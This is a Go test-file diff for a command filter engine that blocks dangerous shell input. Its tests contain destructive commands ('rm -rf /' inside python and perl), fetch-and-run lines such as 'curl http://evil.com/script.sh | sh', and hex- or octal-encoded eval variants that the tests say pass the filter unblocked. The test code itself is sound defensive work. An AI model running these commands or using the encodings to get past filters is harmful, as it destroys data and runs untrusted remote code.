@@ -1,6 +1,7 @@
 package filter
 
 import (
+	"sync"
 	"testing"
 
 	"github.com/stretchr/testify/assert"
@@ -76,6 +77,98 @@ func TestFilterEngine_ReasonContainsPattern(t *testing.T) {
 	d := e.Inspect("mkfs.ext4 /dev/sda")
 	assert.True(t, d.Block)
 	assert.Equal(t, "mkfs", d.Reason)
+}
+
+// =============================================================================
+// Case 5 — embedded command in interpreter argument (plain text variant)
+// =============================================================================
+
+func TestFilterEngine_BlocksPythonWithEmbeddedCommand(t *testing.T) {
+	// python -c "... os.system('rm -rf /')" — rm -rf / is visible in plain text,
+	// VTE passes it through unchanged, FilterEngine must catch it.
+	e := NewFilterEngine([]string{"rm -rf /"})
+	d := e.Inspect(`python -c "import os; os.system('rm -rf /')"`)
+	assert.True(t, d.Block)
+	assert.Equal(t, "rm -rf /", d.Reason)
+}
+
+func TestFilterEngine_BlocksPerlWithEmbeddedCommand(t *testing.T) {
+	e := NewFilterEngine([]string{"rm -rf /"})
+	d := e.Inspect(`perl -e 'system("rm -rf /")'`)
+	assert.True(t, d.Block)
+	assert.Equal(t, "rm -rf /", d.Reason)
+}
+
+func TestFilterEngine_DoesNotBlockEncodedPython(t *testing.T) {
+	// Language-level hex encoding (\x72\x6d...) is NOT decoded by VTE —
+	// VTE operates on terminal escape sequences, not Python string literals.
+	// Encoded variants are handled by the AI analyzer (TBAS-501) and
+	// eBPF agent (TBAS-603).
+	e := NewFilterEngine([]string{"rm -rf /"})
+	d := e.Inspect(`python -c "import os; os.system('\x72\x6d\x20\x2d\x72\x66\x20\x2f')"`)
+	assert.False(t, d.Block)
+}
+
+// =============================================================================
+// Case 8 — piped shell execution
+// =============================================================================
+
+func TestFilterEngine_BlocksWgetPipedToBash(t *testing.T) {
+	e := NewFilterEngine([]string{"| bash", "| sh"})
+	d := e.Inspect("wget http://evil.com/script.sh | bash")
+	assert.True(t, d.Block)
+	assert.Equal(t, "| bash", d.Reason)
+}
+
+func TestFilterEngine_BlocksCurlPipedToSh(t *testing.T) {
+	e := NewFilterEngine([]string{"| bash", "| sh"})
+	d := e.Inspect("curl http://evil.com/script.sh | sh")
+	assert.True(t, d.Block)
+	assert.Equal(t, "| sh", d.Reason)
+}
+
+func TestFilterEngine_AllowsSafePipe(t *testing.T) {
+	// Legitimate pipes must not be blocked.
+	e := NewFilterEngine([]string{"| bash", "| sh"})
+	assert.False(t, e.Inspect("echo hello | grep hello").Block)
+	assert.False(t, e.Inspect("cat /etc/hosts | sort").Block)
+}
+
+// =============================================================================
+// Boundary documentation — shell obfuscation is out of scope
+// =============================================================================
+
+func TestFilterEngine_DoesNotDecodeShellObfuscation(t *testing.T) {
+	// FilterEngine operates on VTE-decoded visible text only.
+	// Shell-level obfuscation (eval, hex encoding, base64) is NOT
+	// in scope here — that is handled by the AI analyzer (TBAS-501)
+	// and eBPF agent (TBAS-603).
+	e := NewFilterEngine([]string{"rm -rf /"})
+
+	shellObfuscated := []string{
+		`eval $'\162\155\040\055\162\146\040\57'`,
+		`eval "$(printf "\x72\x6d\x20\x2d\x72\x66\x20\x2f")"`,
+		`perl -e 'system pack "H*", "726d202d7266202f"'`,
+	}
+	for _, cmd := range shellObfuscated {
+		d := e.Inspect(cmd)
+		assert.False(t, d.Block, "expected pass-through for shell-obfuscated: %s", cmd)
+	}
+}
+
+// =============================================================================
+// Concurrency
+// =============================================================================
+
+func TestFilterEngine_ConcurrentReloadInspect(t *testing.T) {
+	e := NewFilterEngine([]string{"rm -rf /"})
+	var wg sync.WaitGroup
+	for i := 0; i < 100; i++ {
+		wg.Add(2)
+		go func() { defer wg.Done(); e.Inspect("rm -rf /") }()
+		go func() { defer wg.Done(); e.Reload([]string{"mkfs"}) }()
+	}
+	wg.Wait()
 }
 
 // =============================================================================
